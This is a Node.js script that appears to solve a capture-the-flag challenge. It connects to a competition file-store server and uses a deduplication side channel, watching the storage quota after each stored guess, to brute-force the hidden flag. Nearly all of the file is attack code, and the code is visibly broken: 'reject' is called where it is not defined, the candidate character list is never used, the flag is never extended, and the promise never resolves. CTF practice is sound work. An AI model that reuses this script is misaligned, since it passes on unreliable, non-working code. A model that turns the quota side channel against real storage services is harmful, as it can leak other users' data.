const net = require('net');

let flag = 'CTF{';
const CTF_SERVER = 'filestore.2021.ctfcompetition.com';
const CTF_PORT = '1337';

const STORE_COMMAND = 'store\n';
const STATUS_COMMAND = 'status\n';

const lowerCaseLetters = 'abcdefghijklmnopqrstuvwxyz';
const lowerCaseLetterArray = lowerCaseLetters.split('');
const upperCaseLetterArray = lowerCaseLetters.toUpperCase().split('');
const numberArray = '0123456789';
const possibleCharacters = [
    ...lowerCaseLetterArray,
    ...upperCaseLetterArray,
    ...numberArray,
    '}'
];

let socket = new net.Socket();
socket.connect(CTF_PORT, CTF_SERVER);
socket.on('error', function(exception){
    console.error('Exception:');
    console.error(exception);
    reject(exception);
});
socket.on('close', () => console.log('Connection closed'));


function bruteForce() {
    let shouldCheck = false;
    return new Promise(async (resolve, reject) => {
        const handleData = async (data) => {
            const data_As_String = data.toString();

            if(shouldCheck) { 
                // string did not change so continue
                if(data_As_String.includes('Quota: 0.026kB/64.000kB')){
                    socket.write(STORE_COMMAND);
                    return;
                } else { 
                    socket.destroy();
                    socket.connect(CTF_PORT, CTF_SERVER);
                    return;
                }
            }

            if(data_As_String.includes('Menu:')){
                socket.write(STORE_COMMAND);
                shouldCheck = false;
                return;
            }

            if(data_As_String.includes('Send me a line of data...')){
                socket.write(flag);
                shouldCheck = true;
                return;
            }
        };

        socket.on('data', handleData);
    });
}

function main() {
    bruteForce()
        .then(result => console.log('Result:\n' + result))
        .catch(console.error);
}

main();
